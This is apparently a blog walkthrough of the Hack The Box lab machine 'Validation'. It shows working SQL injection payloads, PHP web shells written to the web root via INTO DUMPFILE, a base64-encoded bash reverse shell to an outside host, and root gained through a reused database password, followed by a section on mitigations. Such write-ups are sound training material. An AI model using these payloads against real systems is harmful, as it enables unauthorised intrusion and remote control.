---
layout: post
title: Hack The Box Walkthrough - Validation
date: 2022-05-29
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
permalink: /2022/05/HTB/Validation
img: 2022/05/Validation/Validation.png
---

This is a very easy box. You need to exploit a [SQL Injection](https://portswigger.net/web-security/sql-injection) vulnerability to gain access to the machine. Once connected, you need to find a password on the box to get root. It felt like there should have been more to it. But the site in the box said it was for some qualification for a competition. Maybe the competition box had more on it.

* Room: Validation
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Validation](https://app.hackthebox.com/machines/Validation)
* Author: [ippsec](https://app.hackthebox.com/users/3769)

## Enumeration

As always, I started the box by looking for opened ports. 

```bash
$ rustscan -a target.htb -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.95.235:22
Open 10.129.95.235:80
Open 10.129.95.235:4566
Open 10.129.95.235:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 15:43 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Host is up, received user-set (0.037s latency).
Scanned at 2022-05-29 15:43:32 EDT for 16s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgSpafkjRVogAlgtxt6cFN7sU4sRTiGYC01QloBpbOwerqFUoYNyhCdNP/9rvdhwFpXomoMhDxioWQZb1RTSbR5aCwkzwDRnLz5PKN/7faaoEVjFM1vSnjGwWxzPZJw4Xy8wEbvMDlNZQbWu44UMWhLH+Vp63egRsut0SkTpUy3Ovp/yb3uAeT/4sUPG+LvDgzX
D2QY+O1SV0Y3pE+pRmL3UfRKr2ltMfpcc7y7423+3oRSONHfy1upVUcUZkRIKrl9Qb4CDpxbVi/hYfAFQcOYH+IawAounkeiTMMEtOYbzDysEzVrFcCiGPWOX5+7tu4H7jYnZiel39ka/TFODVA+m2ZJiz2NoKLKTVhouVAGkH7adYtotM62JEtow8MW0HCZ9+cX6ki5cFK9WQhN++KZej2fEZDkxV7913KaIa4HCbi
Dq1Sfr5j7tFAWnNDo097UHXgN5A0mL1zNqwfTBCHQTEga/ztpDE0pmTKS4rkBne9EDn6GpVhSuabX9S/BLk=
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9LolyD5tnJ06EqjRR6bFX/7oOoTeFPw2TKsP1KCHJcsPSVfZIafOYEsWkaq67dsCvOdIZ8VQiNAKfnGiaBLOo=
|   256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJOP8cvEQVqCwuWYT06t/DEGxy6sNajp7CzuvfJzrCRZ
80/tcp   open  http    syn-ack Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    syn-ack nginx
|_http-title: 403 Forbidden
8080/tcp open  http    syn-ack nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Nmap done: 1 IP address (1 host up) scanned in 16.45 seconds
```

There were four ports open on the machine. 
* 22 - SSH
* 80 - HTTP
* 4566 - HTTP
* 8080 - HTTP

Ports 4566 and 8080 had nginx running on them, but there was nothing accessible.


## Site

I opened the website on port 80. 

![Main Site](/assets/images/2022/05/Validation/MainSite.png "Main Site")

It was a simple site that allowed users to register for the [Ultimate Hacking Championship](https://uhc.hackingesports.com/). I created an account.

![Account Page](/assets/images/2022/05/Validation/Account.png "Account Page")

The creation redirected me to `account.php`. It listed other players in the selected county. And showed that the page was built in PHP.

I launched feroxbuster to look for hidden pages. 

```bash
$ feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      268l      747w        0c http://target.htb/
403      GET        9l       28w      275c http://target.htb/.hta
403      GET        9l       28w      275c http://target.htb/.htaccess
403      GET        9l       28w      275c http://target.htb/.htpasswd
403      GET        9l       28w      275c http://target.htb/.hta.php
403      GET        9l       28w      275c http://target.htb/.htaccess.php
403      GET        9l       28w      275c http://target.htb/.htpasswd.php
200      GET        1l        2w       16c http://target.htb/account.php
200      GET        0l        0w        0c http://target.htb/config.php
301      GET        9l       28w      306c http://target.htb/css => http://target.htb/css/
403      GET        9l       28w      275c http://target.htb/css/.hta
403      GET        9l       28w      275c http://target.htb/css/.htaccess
403      GET        9l       28w      275c http://target.htb/css/.htpasswd
200      GET      268l      747w        0c http://target.htb/index.php
403      GET        9l       28w      275c http://target.htb/css/.hta.php
301      GET        9l       28w      305c http://target.htb/js => http://target.htb/js/
403      GET        9l       28w      275c http://target.htb/css/.htpasswd.php
403      GET        9l       28w      275c http://target.htb/css/.htaccess.php
403      GET        9l       28w      275c http://target.htb/js/.hta
403      GET        9l       28w      275c http://target.htb/js/.hta.php
403      GET        9l       28w      275c http://target.htb/js/.htaccess
403      GET        9l       28w      275c http://target.htb/js/.htaccess.php
403      GET        9l       28w      275c http://target.htb/js/.htpasswd
403      GET        9l       28w      275c http://target.htb/js/.htpasswd.php
403      GET        9l       28w      275c http://target.htb/server-status
[####################] - 30s    37704/37704   0s      found:25      errors:2
[####################] - 25s     9426/9426    393/s   http://target.htb
[####################] - 25s     9426/9426    386/s   http://target.htb/
[####################] - 17s     9426/9426    545/s   http://target.htb/css
[####################] - 17s     9426/9426    549/s   http://target.htb/js

```

There was not much else to see there. I tried sending some XSS payload in the username and the country. The XSS worked for me, but no one else reached my server. 

I kept playing with the site. I looked at the user cookie that was set on user creation. 

```http
POST / HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://target.htb
Connection: close
Referer: http://target.htb/
Cookie: user=e6f1a0de3e71d305e9b36bdccc7ba439
Upgrade-Insecure-Requests: 1

username=AAAAAAAAAAAA&country=Brazil
```

```http
HTTP/1.1 302 Found
Date: Sun, 29 May 2022 20:39:02 GMT
Server: Apache/2.4.48 (Debian)
X-Powered-By: PHP/7.4.23
Set-Cookie: user=02737e4e8c87d7466b623c1f844fdd71
Location: /account.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

I realized that the cookie was 32 characters long and looked like an MD5 hash.

```bash
$ echo -n AAAAAAAAAAAA | md5sum
02737e4e8c87d7466b623c1f844fdd71  -
```

The cookie contained the MD5 of the username. I tried using the MD5 of admin. 

![Welcome Admin](/assets/images/2022/05/Validation/WelcomeAdmin.png "Welcome Admin")

I was connected, but it did not show the username and country. I went back to the user creation and created the admin user. This time, it showed the username and country I entered. It looked like the site used the MD5 hash to load the data from some storage on the server. 

Next, I tried sending some SQL in the country, using Burp Repeater.

I posted this: 

```http
POST / HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://target.htb
Connection: close
Referer: http://target.htb/
Cookie: user=21232f297a57a5a743894a0e4a801fc3
Upgrade-Insecure-Requests: 1

username=admin&country=' Or 1 = 1 -- -
```

Then reloaded the account page. 

![SQLI](/assets/images/2022/05/Validation/sqli.png "SQLI")

It listed every user I created. No matter the country I used. 

Next, I checked how many columns needed to be returned by the query. Sending `username=admin&country=' Or 1 = 1 Order By 1 -- -` worked. But `username=admin&country=' Or 1 = 1 Order By 2 -- -` failed. So the query needed to return one column. 

Then I looked at the structure of the database. 

Listing the tables:

```
username=admin&country=' UNION SELECT CONCAT(table_schema, ' - ', table_name) from INFORMATION_SCHEMA.TABLES -- -
```

```
information_schema - ALL_PLUGINS
information_schema - APPLICABLE_ROLES
....
performance_schema - accounts
performance_schema - cond_instances
...
mysql - user
mysql - transaction_registry
...
registration - registration
```

Listing the columns in the registration table:
```
username=admin&country=' UNION SELECT column_name from INFORMATION_SCHEMA.COLUMNS where table_name = 'registration' -- -
```

```
username
userhash
country
regtime
```

And finally, listing the rows in the registration table
```
username=admin&country=' UNION SELECT CONCAT(username, ' - ', userhash, ' - ', country, ' - ', regtime) From registration -- -
```

```
test - 098f6bcd4621d373cade4e832627b4f6 - Canada - 1653862730
admin - 21232f297a57a5a743894a0e4a801fc3 - ' UNION SELECT CONCAT(username, ' - ', userhash, ' - ', country, ' - ', regtime) From registration -- - - 1653863324
brazil - 6e5fa4d9c48ca921c0a2ce1e64c9ae6f - Brazil - 1653863445
albania - 3303daf806aebcd0cfd114f7d267f109 - Albania - 1653863456
```

I had the information from the database. But nothing really helpful to move further. 

I decided to check for [Remote Code Execution (RCE)](https://www.geeksforgeeks.org/what-is-remote-code-execution-rce/). But first I needed to know which database was used.


```
username=admin&country=' UNION SELECT version() -- -

10.5.11-MariaDB-1
```
With some research, I found that I could use `into DUMPFILE` to write a file to the server. 

I sent this query: 

```
username=admin&country=' UNION SELECT '<?php echo `id`;?>' into DUMPFILE '/var/www/html/backdoor.php' -- -
```

Then reloaded the account page to get the query executed. And finally navigated to `backdoor.php`.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

I knew that I could run code on the server. The next step was getting a reverse shell. 

I created the code for the reverse shell.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.122/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIyLzQ0NDQgMD4mMSAK
```

Then I sent the request to get it written in a file. 

```bash
username=admin&country=' UNION SELECT '<?php echo `echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIyLzQ0NDQgMD4mMSAK | base64 -d | bash`;?>' into DUMPFILE '/var/www/html/backdoor2.php' -- -
```

It gave me a reverse shell.

```bash
$ nc -klvnp 4444                                                                      
Listening on 0.0.0.0 4444
Connection received on 10.129.95.235 56866
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ whoami
whoami
www-data
```

From there, I was able to get the user flag.

```bash
www-data@validation:/var/www/html$ ls /home     
ls /home
htb

www-data@validation:/var/www/html$ ls /home/htb
ls /home/htb
user.txt

www-data@validation:/var/www/html$ cat /home/htb/user.txt
cat /home/htb/user.txt
REDACTED
```

## Getting root

From there, getting root was very easy. I checked the content of the `config.php` file. 

```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "REDACTED";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

I tried using this password to su to the `htb` user. 

```bash
www-data@validation:/var/www/html$ su htb
su htb
su: user htb does not exist or the user entry does not contain all the required fields
```

The user did not exist, so I tried it for root. 

```bash
www-data@validation:/var/www/html$ su
su
Password: 

whoami
root
```

It worked! I was root. All that I had left was to get the flag. 

```bash
ls /root 
config
ipp.ko
root.txt
snap

cat /root/root.txt
REDACTED
```

## Mitigation 

To prevent SQL Injection, prepared statement needs to be used for every query. Anything that comes from the user, directly or indirectly, needs to be parametrized. 

The code that inserts and updates users is correct. 

```php
<?php
  require('config.php');
  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {
    $userhash = md5($_POST['username']);
    $sql = "INSERT INTO registration (username, userhash, country, regtime) VALUES (?, ?, ?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("sssi", $_POST['username'], $userhash , $_POST['country'], time());
    if ($stmt->execute()) {;
	    setcookie('user', $userhash);
	    header("Location: /account.php");
	    exit;
    }
    $sql = "update registration set country = ? where username = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $_POST['country'], $_POST['username']);
    $stmt->execute();
    setcookie('user', $userhash);
    header("Location: /account.php");
    exit;
  }
?>
```

The problem is in the code that gets other users from the same country. 

```php
<?php 
  include('config.php');
  $user = $_COOKIE['user'];
  $sql = "SELECT username, country FROM registration WHERE userhash = ?";
  $stmt = $conn->prepare($sql);
  $stmt->bind_param("s", $user);
  $stmt->execute();
  
  $result = $stmt->get_result(); // get the mysqli result
  $row = $result->fetch_assoc(); // fetch data   
  echo '<h1 class="text-white">Welcome ' . $row['username'] . '</h1>';
  echo '<h3 class="text-white">Other Players In ' . $row['country'] . '</h3>';
  $sql = "SELECT username FROM registration WHERE country = '" . $row['country'] . "'";
  $result = $conn->query($sql);
  while ($row = $result->fetch_assoc()) {
    echo "<li class='text-white'>" . $row['username'] . "</li>";
  }
?>
```

The firs query of that page uses a prepared statement. But the second one does not. Sometimes developers think the content from the database is safe since it does not come directly from the users. But the country was provided by the user at registration. So it's not safe. A prepared statement should have been used here also. 

As for the privilege escalation. There were two issues with the password on this box. 

1. The root password was used to access the database. 
1. The root password was stored on a configuration file. Even worst, the file was accessible to everyone on the machine

The solution is simple here. Don't reuse passwords, and store them in a secure location.